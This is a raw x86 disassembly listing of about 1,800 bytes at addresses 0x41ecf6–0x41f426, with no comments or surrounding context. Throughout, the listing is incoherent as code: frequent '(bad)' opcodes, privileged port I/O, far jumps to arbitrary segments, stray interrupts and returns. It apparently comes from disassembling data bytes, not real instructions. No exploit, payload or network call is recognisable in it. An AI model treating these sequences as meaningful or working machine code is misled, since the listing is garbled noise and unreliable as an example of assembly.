  41ecf6:	loope  0x41ecd4
  41ecf8:	jle    0x41ecc0
  41ecfa:	imul   DWORD PTR [ecx+eax*1+0x6d412e1a]
  41ed01:	ss sbb edx,eax
  41ed04:	adc    edx,0xffffffd4
  41ed07:	cmp    eax,0x2412ccae
  41ed0c:	inc    ebx
  41ed0d:	inc    edx
  41ed0e:	or     dl,BYTE PTR [edx+0x22]
  41ed11:	shl    ah,0x93
  41ed14:	jmp    0xb5169d54
  41ed19:	or     eax,0x8e74cde9
  41ed1e:	xor    al,0xc8
  41ed20:	mov    ecx,0x5b270524
  41ed25:	inc    edx
  41ed26:	out    dx,al
  41ed27:	faddp  st(5),st
  41ed29:	shl    DWORD PTR [edx+0x40668593],0x5b
  41ed30:	icebp  
  41ed31:	cmp    al,0xa2
  41ed33:	cld    
  41ed34:	push   edi
  41ed35:	adc    al,0xa7
  41ed37:	add    DWORD PTR [ecx-0x70],edi
  41ed3a:	sahf   
  41ed3b:	addr16 add eax,0x9eef740f
  41ed41:	jae    0x41ed23
  41ed43:	xchg   edx,eax
  41ed44:	out    dx,al
  41ed45:	int    0xff
  41ed47:	loop   0x41ed7d
  41ed49:	aaa    
  41ed4a:	sbb    eax,0xa3f374ba
  41ed4f:	xchg   esp,eax
  41ed50:	outs   dx,BYTE PTR ds:[esi]
  41ed51:	jbe    0x41ed40
  41ed53:	(bad)  
  41ed54:	dec    edx
  41ed55:	jnp    0x41ece7
  41ed57:	pop    esi
  41ed58:	and    ebp,ecx
  41ed5a:	ficomp DWORD PTR [ebp+0x21f1919]
  41ed60:	ds push edi
  41ed62:	push   0xffffffa7
  41ed64:	mov    ch,0x28
  41ed66:	inc    edx
  41ed67:	sbb    edx,DWORD PTR [ebp+0x65d22ddd]
  41ed6d:	imul   ebp,edx,0x22
  41ed70:	pop    ebp
  41ed71:	(bad)  
  41ed72:	mov    BYTE PTR [edx+0x46d2e7da],cl
  41ed78:	cmp    DWORD PTR [eax+0x5671fe47],0x1626333c
  41ed82:	jne    0x41ed73
  41ed84:	inc    esi
  41ed85:	cmp    al,0x75
  41ed87:	aaa    
  41ed88:	dec    esi
  41ed89:	cli    
  41ed8a:	cmp    eax,0x289726f2
  41ed8f:	not    BYTE PTR ds:0x7423751a
  41ed95:	adc    BYTE PTR [ecx+0x1103c6f5],bl
  41ed9b:	inc    ebp
  41ed9c:	(bad)  
  41ed9d:	cld    
  41ed9e:	mov    ebp,0x1b6e6e93
  41eda3:	mov    al,ds:0xb6ab0b68
  41eda8:	jnp    0x41edd4
  41edaa:	je     0x41ed49
  41edac:	or     edi,0x98d707d6
  41edb2:	loopne 0x41edac
  41edb4:	xchg   esi,eax
  41edb5:	daa    
  41edb6:	dec    ebp
  41edb7:	mov    ebx,0x6946b8c2
  41edbc:	mov    esp,0x7f0e7246
  41edc1:	(bad)  
  41edc2:	rol    BYTE PTR [edx],cl
  41edc4:	(bad)
  41edc7:	(bad)  
  41edc8:	sbb    BYTE PTR [edx],al
  41edca:	sub    cl,cl
  41edcc:	popa   
  41edcd:	mov    edi,esi
  41edcf:	push   edi
  41edd0:	aam    0x15
  41edd2:	bound  esi,QWORD PTR [eax-0x4]
  41edd5:	and    DWORD PTR [ebp+0x7b09337c],esi
  41eddb:	(bad)
  41eddf:	lods   al,BYTE PTR ds:[esi]
  41ede0:	jg     0x41ee5a
  41ede2:	arpl   WORD PTR [esi+0x6e99c077],si
  41ede8:	stos   DWORD PTR es:[edi],eax
  41ede9:	mov    edx,0xe9d8b60c
  41edee:	mov    edx,0x464d6ea7
  41edf3:	stc    
  41edf4:	push   0xffffffa1
  41edf6:	sub    al,0xd
  41edf8:	enter  0x7a7,0x95
  41edfc:	push   esi
  41edfd:	xor    DWORD PTR [ecx+0x728668cf],edx
  41ee03:	pop    ss
  41ee04:	cmp    al,0xf5
  41ee06:	and    BYTE PTR [edx-0x59],0xf1
  41ee0a:	pushf  
  41ee0b:	repnz xchg edx,eax
  41ee0d:	xor    bl,BYTE PTR [ebp+0x287f09ca]
  41ee13:	jne    0x41edfc
  41ee15:	dec    esi
  41ee16:	mov    ebp,0x28c6286a
  41ee1b:	outs   dx,BYTE PTR ds:[esi]
  41ee1c:	xchg   ebp,eax
  41ee1d:	scas   al,BYTE PTR es:[edi]
  41ee1e:	sub    edx,esi
  41ee20:	xchg   ebp,eax
  41ee21:	dec    ebx
  41ee22:	mov    edi,0xf6d716de
  41ee27:	xor    BYTE PTR [ebp-0x59],bl
  41ee2a:	xchg   edx,eax
  41ee2b:	dec    esp
  41ee2c:	jb     0x41ee79
  41ee2e:	push   ds
  41ee2f:	cmc    
  41ee30:	inc    edx
  41ee31:	adc    ebp,DWORD PTR [edx]
  41ee33:	cmp    ch,0x3
  41ee36:	aad    0x78
  41ee38:	adc    eax,0xf80a662f
  41ee3d:	mov    eax,ss
  41ee3f:	pop    ss
  41ee40:	mov    cl,0xe4
  41ee42:	(bad)  
  41ee43:	scas   al,BYTE PTR es:[edi]
  41ee44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee45:	lods   eax,DWORD PTR ds:[esi]
  41ee46:	jo     0x41ee8d
  41ee48:	sbb    al,BYTE PTR [edx-0x18748b27]
  41ee4e:	add    al,bl
  41ee50:	sbb    esi,DWORD PTR [edx+0x20]
  41ee53:	push   ds
  41ee54:	ret    
  41ee55:	jo     0x41edfe
  41ee57:	pop    edi
  41ee58:	adc    ebp,DWORD PTR [edi+ecx*2]
  41ee5b:	lods   al,BYTE PTR ds:[esi]
  41ee5c:	jae    0x41ee35
  41ee5e:	sbb    eax,0x1625f983
  41ee63:	jp     0x41ee99
  41ee65:	push   ds
  41ee66:	pusha  
  41ee67:	fs aam 0x5e
  41ee6a:	data16 fiadd WORD PTR [ebx-0x4d]
  41ee6e:	sbb    eax,0xfe6c99e6
  41ee73:	test   BYTE PTR [eax+0x75],bl
  41ee76:	vcvtsi2ss xmm7,xmm7,DWORD PTR [ebp+eiz*4+0x9]
  41ee7c:	fcmovb st,st(2)
  41ee7e:	sub    BYTE PTR [edi],cl
  41ee80:	popf   
  41ee81:	scas   al,BYTE PTR es:[edi]
  41ee82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee83:	in     al,0x5f
  41ee85:	push   esp
  41ee86:	sbb    DWORD PTR [edi],esi
  41ee88:	inc    esi
  41ee89:	push   ss
  41ee8a:	mov    al,BYTE PTR [ebp+eiz*1+0x7c]
  41ee8e:	add    dh,BYTE PTR [edx-0x12]
  41ee91:	cmp    bh,BYTE PTR [ebx]
  41ee93:	push   0x15
  41ee95:	test   BYTE PTR [eax-0x6942f31b],dl
  41ee9b:	push   ebx
  41ee9c:	push   esi
  41ee9d:	xor    al,0x8a
  41ee9f:	mov    ds:0x25e24d76,al
  41eea4:	sbb    al,0x23
  41eea6:	je     0x41eef1
  41eea8:	out    dx,al
  41eea9:	and    DWORD PTR [eax-0x6],edx
  41eeac:	mov    al,0x56
  41eeae:	scas   al,BYTE PTR es:[edi]
  41eeaf:	push   ss
  41eeb0:	pop    es
  41eeb1:	or     al,0xb1
  41eeb3:	fidiv  DWORD PTR [edi]
  41eeb5:	xor    DWORD PTR [esp+ebp*4-0x55],ecx
  41eeb9:	sti    
  41eeba:	mov    ebp,0x15d9f983
  41eebf:	xor    cl,ah
  41eec1:	mov    cl,0xc5
  41eec3:	mov    dh,0x50
  41eec5:	nop
  41eec6:	xchg   edi,ebp
  41eec8:	push   ds
  41eec9:	sbb    bl,BYTE PTR [edi+0x13]
  41eecc:	mov    dh,0x45
  41eece:	(bad)  
  41eecf:	cmp    cl,BYTE PTR ds:0x7b15c018
  41eed5:	xchg   edi,eax
  41eed6:	out    dx,al
  41eed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed8:	(bad)  
  41eed9:	adc    eax,0xc27dad64
  41eede:	or     BYTE PTR [edx-0x6a6462f8],cl
  41eee4:	stc    
  41eee5:	push   edx
  41eee6:	push   edx
  41eee7:	push   0x2ec7b924
  41eeec:	sub    ah,BYTE PTR [ebx-0x3ae6ca93]
  41eef2:	jg     0x41ef52
  41eef4:	sub    esp,esi
  41eef6:	and    esp,eax
  41eef8:	sub    dl,BYTE PTR [ebp-0x1e5bdb98]
  41eefe:	pop    ebx
  41eeff:	jo     0x41ef7a
  41ef01:	mov    edi,?
  41ef03:	xor    eax,0x2bd4888
  41ef08:	mov    esp,0xf825a867
  41ef0d:	pop    esi
  41ef0e:	loop   0x41ef2f
  41ef10:	(bad)  
  41ef11:	(bad)  
  41ef12:	or     BYTE PTR [ebx],dh
  41ef14:	dec    eax
  41ef15:	je     0x41ef4c
  41ef17:	pop    ecx
  41ef18:	pushf  
  41ef19:	stos   BYTE PTR es:[edi],al
  41ef1a:	or     DWORD PTR [eax-0x65],eax
  41ef1d:	nop
  41ef1e:	add    ch,BYTE PTR [ecx-0xb]
  41ef21:	inc    esi
  41ef22:	dec    ebp
  41ef23:	jp     0x41eec0
  41ef25:	in     eax,dx
  41ef26:	lods   eax,DWORD PTR ds:[esi]
  41ef27:	jecxz  0x41ef90
  41ef29:	nop
  41ef2a:	ror    BYTE PTR [edi+0x3209daec],1
  41ef30:	inc    ebp
  41ef31:	ss pop ecx
  41ef33:	outs   dx,BYTE PTR ds:[esi]
  41ef35:	add    dh,BYTE PTR ds:0x97a0f4c7
  41ef3b:	mov    esp,0x87b5c782
  41ef40:	or     eax,0x38e9f2db
  41ef45:	imul   edx,DWORD PTR [ecx],0xba76ff4f
  41ef4b:	xchg   esi,eax
  41ef4c:	jns    0x41eefd
  41ef4e:	adc    DWORD PTR [edx+0x0],esi
  41ef51:	and    DWORD PTR [eax],edi
  41ef53:	push   edx
  41ef54:	adc    al,0x79
  41ef56:	xchg   ecx,eax
  41ef57:	outs   dx,DWORD PTR ds:[esi]
  41ef58:	push   0x32
  41ef5a:	retf   
  41ef5b:	inc    esi
  41ef5c:	clc    
  41ef5d:	fidivr WORD PTR [eax-0x6c8f4d28]
  41ef63:	leave  
  41ef64:	shr    esi,cl
  41ef66:	test   eax,0x9dbcade6
  41ef6b:	pop    ss
  41ef6c:	jecxz  0x41ef44
  41ef6e:	mov    esp,0x22bda59f
  41ef73:	or     bh,0xe7
  41ef76:	dec    ebp
  41ef77:	pcmpgtd mm0,mm6
  41ef7a:	js     0x41efc9
  41ef7c:	rol    BYTE PTR [ebx+esi*2+0x70387606],1
  41ef83:	xor    bl,BYTE PTR [eax+0x2b]
  41ef86:	ret    0x5e8b
  41ef89:	ret    
  41ef8a:	sub    ecx,DWORD PTR [eax+0x6a]
  41ef8d:	adc    al,0xca
  41ef8f:	or     al,0x5b
  41ef91:	sahf   
  41ef92:	div    edx
  41ef94:	dec    eax
  41ef95:	or     al,0x45
  41ef97:	push   ss
  41ef98:	mov    ecx,0xac6206
  41ef9d:	in     eax,0x1f
  41ef9f:	clc    
  41efa0:	mov    ah,BYTE PTR [eax]
  41efa2:	clc    
  41efa3:	jns    0x41f000
  41efa5:	mov    WORD PTR [ebx],ds
  41efa7:	or     dl,bl
  41efa9:	das    
  41efaa:	jae    0x41f01f
  41efac:	mov    dh,0x49
  41efae:	int3   
  41efaf:	popf   
  41efb0:	cmp    ch,bl
  41efb2:	pop    ecx
  41efb3:	adc    ah,BYTE PTR [ecx]
  41efb5:	xor    dl,BYTE PTR [ebp-0x3338f081]
  41efbb:	in     al,0x4e
  41efbd:	push   ds
  41efbe:	cmp    dh,0xba
  41efc1:	pop    edi
  41efc2:	fst    DWORD PTR [ecx+0x4c]
  41efc5:	mov    ds:0x5c3edb1c,al
  41efca:	add    eax,0x5f0b37db
  41efcf:	mov    dl,0xac
  41efd1:	jmp    0x5b71:0x11bf7c16
  41efd8:	lahf   
  41efd9:	enter  0xd254,0x21
  41efdd:	and    DWORD PTR [edx-0x48],ebx
  41efe0:	and    BYTE PTR [esi+0x27808bd6],dl
  41efe6:	ja     0x41f051
  41efe8:	jae    0x41ef75
  41efea:	sti    
  41efeb:	stos   BYTE PTR es:[edi],al
  41efec:	out    0xcd,al
  41efee:	jp     0x41f061
  41eff0:	push   0x7f21315a
  41eff5:	adc    al,0x3a
  41eff7:	mov    dh,0xe7
  41eff9:	push   eax
  41effa:	int    0x7a
  41effc:	mov    ds:0xc02bee2e,eax
  41f001:	push   esp
  41f002:	scas   eax,DWORD PTR es:[edi]
  41f003:	pop    esp
  41f004:	and    eax,0xcd64e303
  41f009:	ja     0x41efd1
  41f00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f00c:	fmul   st,st(2)
  41f00e:	mov    ebp,0x382b12de
  41f013:	mov    BYTE PTR ss:[eax-0x3c],bl
  41f017:	mov    BYTE PTR [ebx],dl
  41f019:	xchg   ecx,eax
  41f01a:	jns    0x41f03e
  41f01c:	int3   
  41f01d:	or     cl,ch
  41f01f:	fld    QWORD PTR [ecx-0x44bd8328]
  41f025:	sub    esi,DWORD PTR [esi-0x44]
  41f028:	in     eax,0x5f
  41f02a:	sbb    cl,BYTE PTR [edi+0x4062df64]
  41f030:	or     BYTE PTR [edx+edi*8+0x2d],0x13
  41f035:	fstp   QWORD PTR [ecx+ebp*8-0x8aeee98]
  41f03c:	mov    dl,0x2c
  41f03e:	inc    esp
  41f03f:	(bad)  
  41f040:	outs   dx,BYTE PTR ds:[esi]
  41f041:	sub    BYTE PTR [esi],0x8c
  41f044:	lods   eax,DWORD PTR ds:[esi]
  41f045:	sahf   
  41f046:	inc    ebp
  41f047:	call   0x3eb7:0x1a9436bb
  41f04e:	sbb    esi,DWORD PTR [edi-0x25aae919]
  41f054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f055:	mov    ah,0xac
  41f057:	aas    
  41f058:	sahf   
  41f059:	xor    eax,0x18a3bf19
  41f05e:	mov    eax,0xe35e9fe6
  41f063:	loopne 0x41f013
  41f065:	sub    ecx,DWORD PTR es:[ebx]
  41f068:	jne    0x41f037
  41f06a:	jmp    0x1fdf:0xea488964
  41f071:	out    dx,eax
  41f072:	push   0x1f9e166c
  41f077:	das    
  41f078:	lods   eax,DWORD PTR ds:[esi]
  41f079:	shl    ecx,1
  41f07b:	ins    BYTE PTR es:[edi],dx
  41f07c:	and    BYTE PTR [edx+0x16d4aac0],al
  41f082:	push   0xd5d0340b
  41f087:	inc    edx
  41f088:	xor    eax,0xde88c2cd
  41f08d:	or     BYTE PTR [edx+0x189d7171],bh
  41f093:	add    DWORD PTR [eax],0xe9da635c
  41f099:	xor    BYTE PTR [ebx],bh
  41f09b:	mov    WORD PTR [ecx+ebx*8+0x70],?
  41f09f:	and    eax,0x80f58357
  41f0a4:	mov    WORD PTR [ecx],es
  41f0a6:	ja     0x41f0a6
  41f0a8:	jo     0x41f081
  41f0aa:	mov    ds:0xe60949fa,al
  41f0af:	mov    esi,0x24db6861
  41f0b4:	inc    edx
  41f0b5:	loope  0x41f05d
  41f0b7:	outs   dx,DWORD PTR ds:[esi]
  41f0b8:	or     al,0x12
  41f0ba:	push   0x4f8f5bd2
  41f0bf:	push   ss
  41f0c0:	push   esp
  41f0c1:	or     bh,al
  41f0c3:	aas    
  41f0c4:	pop    ss
  41f0c5:	iret   
  41f0c6:	dec    edx
  41f0c7:	jb     0x41f134
  41f0c9:	push   es
  41f0ca:	sub    al,0xba
  41f0cc:	imul   ecx,edi,0x6b571795
  41f0d2:	and    al,0x2f
  41f0d4:	push   cs
  41f0d5:	jnp    0x41f108
  41f0d7:	(bad)  
  41f0d8:	pop    ecx
  41f0d9:	jae    0x41f0ca
  41f0db:	test   al,0xca
  41f0dd:	xchg   ebx,eax
  41f0de:	mov    dh,0xed
  41f0e0:	jg     0x41f0b9
  41f0e2:	jmp    0x835a:0x66824363
  41f0e9:	mov    ds:0x877f7b99,eax
  41f0ee:	mul    DWORD PTR [edx+eax*2-0x1]
  41f0f2:	jae    0x41f0db
  41f0f4:	ins    DWORD PTR es:[edi],dx
  41f0f5:	inc    ecx
  41f0f6:	xor    dh,BYTE PTR [ebx-0x4c7d40e9]
  41f0fc:	div    DWORD PTR [esi-0x1145fa33]
  41f102:	sub    DWORD PTR [ebp-0x61],eax
  41f105:	stos   BYTE PTR es:[edi],al
  41f106:	sahf   
  41f107:	pop    esi
  41f108:	(bad)  
  41f109:	mov    ds,WORD PTR [ebp+0x63df773]
  41f10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f110:	call   0x317a8a29
  41f115:	lods   al,BYTE PTR ds:[esi]
  41f116:	bswap  esi
  41f118:	in     eax,0xf7
  41f11a:	in     eax,dx
  41f11b:	push   ebp
  41f11c:	popa   
  41f11d:	in     al,0x35
  41f11f:	cld    
  41f120:	or     BYTE PTR [ebx-0x13],cl
  41f123:	clc    
  41f124:	int    0x99
  41f126:	cmp    edx,DWORD PTR [edx]
  41f128:	clc    
  41f129:	and    eax,0x6d8f9f2
  41f12e:	retf   
  41f12f:	pop    edx
  41f130:	pusha  
  41f131:	js     0x41f106
  41f133:	sbb    eax,0x3b3c0ac6
  41f138:	adc    eax,0xcb3228fc
  41f13d:	jge    0x41f18e
  41f13f:	mov    WORD PTR [esi-0x2c4a23f0],?
  41f145:	add    ch,BYTE PTR [ebp+0x11]
  41f148:	push   es
  41f149:	or     BYTE PTR [esi+0x56],bh
  41f14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f14d:	dec    ebx
  41f14e:	mov    eax,0xf0696744
  41f153:	fst    QWORD PTR [edi+0xd]
  41f156:	xor    ecx,DWORD PTR [ebp+0x2e]
  41f159:	cmp    BYTE PTR [esi+edx*2+0x20],dh
  41f15d:	lods   al,BYTE PTR ds:[esi]
  41f15e:	pop    ebx
  41f15f:	xchg   BYTE PTR [ebx],bh
  41f161:	cdq    
  41f162:	fimul  WORD PTR [edx+0x3af7a33c]
  41f168:	mov    DWORD PTR [ebp-0x23],edi
  41f16b:	xor    DWORD PTR [ebx+0x65],ebx
  41f16e:	add    dl,dl
  41f170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f171:	add    bl,BYTE PTR [ebx+edi*8-0x7c3a08a7]
  41f178:	pop    ds
  41f179:	aam    0x9b
  41f17b:	add    eax,0xff993d8c
  41f180:	and    BYTE PTR [ecx],dl
  41f182:	shl    WORD PTR [ebx+0x14],cl
  41f186:	mov    ds:0x800dea5f,al
  41f18b:	mov    edx,0xac1ee836
  41f190:	add    bl,BYTE PTR [ecx+0x6f]
  41f193:	es je  0x41f215
  41f196:	mov    eax,ds:0xd184d482
  41f19b:	fwait
  41f19c:	adc    edi,DWORD PTR [edi]
  41f19e:	popf   
  41f19f:	dec    esp
  41f1a0:	iret   
  41f1a1:	inc    edi
  41f1a2:	in     al,dx
  41f1a3:	ret    0x7933
  41f1a6:	push   es
  41f1a7:	imul   edx,DWORD PTR [eax-0x45],0x23
  41f1ab:	sbb    al,0x49
  41f1ad:	div    BYTE PTR [edi+0x60d9d617]
  41f1b3:	adc    bh,BYTE PTR [edi+ecx*8]
  41f1b6:	je     0x41f231
  41f1b8:	xchg   edx,eax
  41f1b9:	add    dl,al
  41f1bb:	xor    DWORD PTR [ecx],0xffffffc5
  41f1be:	push   ebp
  41f1bf:	xchg   ebx,eax
  41f1c0:	mov    ah,0xc
  41f1c2:	dec    ecx
  41f1c3:	fisttp WORD PTR [edi-0x14]
  41f1c6:	loop   0x41f17c
  41f1c8:	jp     0x41f1d0
  41f1ca:	jp     0x41f213
  41f1cc:	retf   0xe467
  41f1cf:	je     0x41f219
  41f1d1:	scas   al,BYTE PTR es:[edi]
  41f1d2:	jmp    0xb8e430c0
  41f1d7:	(bad)  [edx+0x1ba20dff]
  41f1dd:	add    edx,ebp
  41f1df:	fucomp st(1)
  41f1e1:	mov    al,0x6d
  41f1e3:	std    
  41f1e4:	test   eax,0x5ff49b64
  41f1e9:	sbb    ebp,DWORD PTR [edx+0xe]
  41f1ec:	aad    0x11
  41f1ee:	and    ah,BYTE PTR [ecx]
  41f1f0:	fild   WORD PTR [ebp-0x25]
  41f1f3:	mov    esi,0x1df5798a
  41f1f8:	push   esi
  41f1f9:	or     al,0xcf
  41f1fb:	ds clc 
  41f1fd:	cmp    BYTE PTR [edi+edi*8+0x6b],bl
  41f201:	and    DWORD PTR [ebp+0x719da29e],eax
  41f207:	ja     0x41f258
  41f209:	dec    ebp
  41f20a:	adc    bl,BYTE PTR [esi]
  41f20c:	inc    eax
  41f20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20e:	fisub  DWORD PTR [edx+0x1e1981c8]
  41f214:	pop    ss
  41f215:	shr    DWORD PTR [edi-0x68],1
  41f218:	or     eax,0x26ed3d1e
  41f21d:	ds call 0x570f:0xe8697e05
  41f225:	out    dx,eax
  41f226:	jb     0x41f1af
  41f228:	scas   al,BYTE PTR es:[edi]
  41f229:	(bad)
  41f22d:	xor    al,0xbc
  41f22f:	repz jge 0x41f216
  41f232:	fidiv  DWORD PTR [esi+ecx*2]
  41f235:	inc    ebp
  41f236:	sbb    DWORD PTR [esp+edi*8],ebp
  41f239:	pop    ds
  41f23a:	adc    BYTE PTR [esi+ecx*2],al
  41f23d:	push   ecx
  41f23e:	(bad)  
  41f23f:	in     al,dx
  41f240:	jns    0x41f1e2
  41f242:	aad    0x1f
  41f244:	mov    eax,0xd70ee403
  41f249:	call   0xad7d093
  41f24e:	jmp    esp
  41f250:	fstp   DWORD PTR [ebp+0x7ae52ee6]
  41f256:	enter  0x117b,0xd9
  41f25a:	out    dx,al
  41f25b:	add    cl,cl
  41f25d:	lods   eax,DWORD PTR ds:[esi]
  41f25e:	ss lock pop ebp
  41f261:	out    dx,al
  41f262:	mov    cl,0x8e
  41f264:	fsubr  QWORD PTR [esi+ebp*1]
  41f267:	(bad)  
  41f268:	cmp    bh,BYTE PTR [ebx+0x5696384f]
  41f26e:	stos   DWORD PTR es:[edi],eax
  41f26f:	xchg   DWORD PTR [ebx],esi
  41f271:	jnp    0x41f261
  41f273:	mov    edi,0x28cdb39a
  41f278:	pop    ss
  41f279:	push   cs
  41f27a:	out    0x90,al
  41f27c:	sbb    esp,DWORD PTR [esi]
  41f27e:	(bad)  
  41f27f:	or     ebp,DWORD PTR [esi-0x29]
  41f282:	xor    eax,0xbedefab8
  41f287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f288:	add    al,BYTE PTR [esi+0x2e]
  41f28b:	fwait
  41f28c:	mov    esp,DWORD PTR [edx]
  41f28e:	ret    
  41f28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f290:	mov    eax,0xbd2cb9e2
  41f295:	xor    BYTE PTR [esi-0x1],ah
  41f298:	or     eax,0xf112ec49
  41f29d:	stos   BYTE PTR es:[edi],al
  41f29e:	imul   esi,DWORD PTR [eax+0x676ce62d],0xc94503bd
  41f2a8:	out    0x62,al
  41f2aa:	iret   
  41f2ab:	fistp  QWORD PTR [ebx]
  41f2ad:	push   ss
  41f2ae:	lea    esp,[eax+ebx*2+0x6a95cc59]
  41f2b5:	xchg   ebp,eax
  41f2b6:	std    
  41f2b7:	in     eax,0x87
  41f2b9:	push   esi
  41f2ba:	xor    al,0x37
  41f2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2bd:	cdq    
  41f2be:	stos   DWORD PTR es:[edi],eax
  41f2bf:	mov    esp,DWORD PTR [eax+ebx*8]
  41f2c2:	jge    0x41f27f
  41f2c4:	hlt    
  41f2c5:	cs xchg edx,eax
  41f2c7:	xor    BYTE PTR [esi+ecx*1-0x15],al
  41f2cb:	inc    eax
  41f2cc:	cs cdq 
  41f2ce:	cs inc esp
  41f2d0:	clc    
  41f2d1:	sbb    eax,0xdbb58715
  41f2d6:	lock loop 0x41f292
  41f2d9:	stc    
  41f2da:	inc    esp
  41f2db:	cmp    esi,esp
  41f2dd:	jns    0x41f320
  41f2df:	xlat   BYTE PTR ds:[ebx]
  41f2e0:	(bad)  
  41f2e1:	jp     0x41f2b1
  41f2e3:	jne    0x41f268
  41f2e5:	jp     0x41f348
  41f2e7:	jp     0x41f322
  41f2e9:	aad    0xf5
  41f2eb:	clc    
  41f2ec:	sbb    eax,0x1df7d2d6
  41f2f1:	mov    DWORD PTR [esi],edx
  41f2f3:	imul   eax,edi,0xf99fb547
  41f2f9:	push   ss
  41f2fa:	mov    dl,0x6e
  41f2fc:	sub    ch,BYTE PTR [ebp-0x25]
  41f2ff:	fstp   QWORD PTR [eax]
  41f301:	mov    fs,WORD PTR [esi]
  41f303:	ins    DWORD PTR es:[edi],dx
  41f304:	mul    BYTE PTR [edx+0x5e]
  41f307:	cmp    eax,esp
  41f309:	ins    DWORD PTR es:[edi],dx
  41f30a:	scas   al,BYTE PTR es:[edi]
  41f30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f30c:	sbb    ch,BYTE PTR [eax-0x5d4e720f]
  41f312:	mov    BYTE PTR [edx-0x30],0x58
  41f316:	xor    DWORD PTR [eax+ecx*2-0xe749616],esp
  41f31d:	pop    esp
  41f31e:	aad    0xc3
  41f320:	or     BYTE PTR [ecx+0x54],al
  41f323:	sbb    DWORD PTR [ecx-0x9],esp
  41f326:	sub    ch,BYTE PTR [esi-0x5]
  41f329:	push   cs
  41f32a:	in     al,0x4d
  41f32c:	aas    
  41f32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f32e:	xchg   esp,eax
  41f32f:	lds    esp,FWORD PTR [ecx]
  41f331:	xchg   di,ax
  41f333:	inc    esp
  41f334:	xor    BYTE PTR [edx-0x31f27de0],dh
  41f33a:	push   eax
  41f33b:	sub    DWORD PTR [ebx-0x561e98f5],edx
  41f341:	or     al,0xd4
  41f343:	or     BYTE PTR [esi-0x2322bc38],dl
  41f349:	aam    0xca
  41f34b:	in     al,0x17
  41f34d:	jmp    0xa86098a2
  41f352:	sbb    bl,BYTE PTR [edi-0x64]
  41f355:	mov    cl,0x45
  41f357:	jbe    0x41f393
  41f359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f35a:	mov    dl,0x79
  41f35c:	mov    esi,DWORD PTR [edi-0x1cda8d42]
  41f362:	rol    BYTE PTR [ecx-0x7a],0x99
  41f366:	pop    edx
  41f367:	gs ret 
  41f369:	adc    dh,BYTE PTR [ebp+0x2e348b8e]
  41f36f:	(bad)  
  41f370:	pop    edi
  41f371:	xchg   esi,eax
  41f372:	nop
  41f373:	shl    BYTE PTR [ebp+0x77ae4c4d],cl
  41f379:	ins    DWORD PTR es:[edi],dx
  41f37a:	out    0x31,eax
  41f37c:	std    
  41f37d:	mov    al,0x1c
  41f37f:	jmp    0x41f359
  41f381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f382:	int    0xe0
  41f384:	pusha  
  41f385:	dec    ebp
  41f386:	adc    eax,0x4a27b4fa
  41f38b:	dec    eax
  41f38c:	adc    al,0xcf
  41f38e:	lods   al,BYTE PTR ds:[esi]
  41f38f:	dec    esi
  41f390:	xlat   BYTE PTR ds:[ebx]
  41f391:	dec    edi
  41f392:	bound  ebx,QWORD PTR cs:[ecx+0x13]
  41f396:	mov    cl,0x2b
  41f398:	ror    DWORD PTR [edx-0x2b79c4a7],0xa2
  41f39f:	fisttp WORD PTR [ecx]
  41f3a1:	js     0x41f328
  41f3a3:	popf   
  41f3a4:	ret    0xd567
  41f3a7:	iret   
  41f3a8:	div    dl
  41f3aa:	sub    DWORD PTR [ebx-0x46],ebp
  41f3ad:	loope  0x41f3f3
  41f3af:	mov    dh,0x61
  41f3b1:	stos   DWORD PTR es:[edi],eax
  41f3b2:	dec    ebx
  41f3b3:	push   cs
  41f3b4:	aam    0x7f
  41f3b6:	xchg   esi,eax
  41f3b7:	test   BYTE PTR [esi-0x7fafb026],dh
  41f3bd:	lds    ecx,FWORD PTR [edi-0x71]
  41f3c0:	add    ch,bh
  41f3c2:	push   edx
  41f3c3:	mov    edi,0x72b519d4
  41f3c8:	adc    edx,eax
  41f3ca:	aam    0xcb
  41f3cc:	pop    ebp
  41f3cd:	ins    BYTE PTR es:[edi],dx
  41f3ce:	add    BYTE PTR [ebx-0x7e8d85c9],bl
  41f3d4:	cwde   
  41f3d5:	mov    ah,0xc2
  41f3d7:	sub    dh,ah
  41f3d9:	and    ah,BYTE PTR [esi]
  41f3db:	sti    
  41f3dc:	loopne 0x41f3d9
  41f3de:	push   esi
  41f3df:	push   0x72
  41f3e1:	mov    bh,0x1e
  41f3e3:	outs   dx,BYTE PTR ds:[esi]
  41f3e4:	and    al,0x71
  41f3e6:	inc    eax
  41f3e7:	jle    0x41f3ab
  41f3e9:	inc    edi
  41f3ea:	std    
  41f3eb:	(bad)  
  41f3ec:	in     eax,0xb9
  41f3ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3ef:	inc    ebx
  41f3f0:	test   eax,0x8ea53e7b
  41f3f5:	or     eax,0x7b867e40
  41f3fa:	sub    eax,DWORD PTR gs:[esi-0x71]
  41f3fe:	push   esi
  41f3ff:	dec    eax
  41f400:	cli    
  41f401:	call   0xa63f:0xb6900f22
  41f408:	fcomp  QWORD PTR [ebx]
  41f40a:	add    bh,dh
  41f40c:	fwait
  41f40d:	fs jmp 0xaf55:0x3cd540cf
  41f415:	fxch   st(4)
  41f417:	inc    edi
  41f418:	lods   al,BYTE PTR ds:[esi]
  41f419:	cdq    
  41f41a:	and    al,ah
  41f41c:	xchg   edx,eax
  41f41d:	hlt    
  41f41e:	push   ss
  41f41f:	push   ds
  41f420:	inc    esi
  41f421:	mov    edi,DWORD PTR [edx]
  41f423:	aaa    
  41f424:	push   ecx
  41f425:	retf   
  41f426:	pop    ecx
